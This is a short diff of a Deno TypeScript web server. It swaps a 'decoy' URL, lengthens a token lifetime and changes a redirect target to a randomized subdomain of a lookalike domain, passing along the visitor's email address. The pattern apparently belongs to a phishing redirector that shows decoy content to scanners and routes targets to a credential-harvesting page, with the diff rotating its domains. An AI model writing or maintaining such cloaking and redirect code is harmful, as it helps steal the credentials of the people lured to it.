@@ -1,6 +1,6 @@
 const PORT = Number(Deno.env.get("PORT") || 8080);
-const DECOY_URL = "https://seeking.com";
-const TOKEN_TTL_MS = 30_000;
+const DECOY_URL = "https://medium.com";
+const TOKEN_TTL_MS = 60_000;
 const tokens = new Map<string, number>();
 
 function randomString(len: number): string {
@@ -65,7 +65,7 @@ Deno.serve({ port: PORT }, (req: Request): Response => {
       const queryString = url.searchParams.get("q") || "";
       const sub = randomString(5);
       const destination =
-        `https://details${sub}.validate.equiteq.org${currentPath}?q=a` +
+        `https://file${sub}.equiteqedge.com${currentPath}?q=a` +
         `${queryString ? "&" + queryString : ""}` +
         `${email ? "&email=" + encodeURIComponent(email) : ""}`;
 
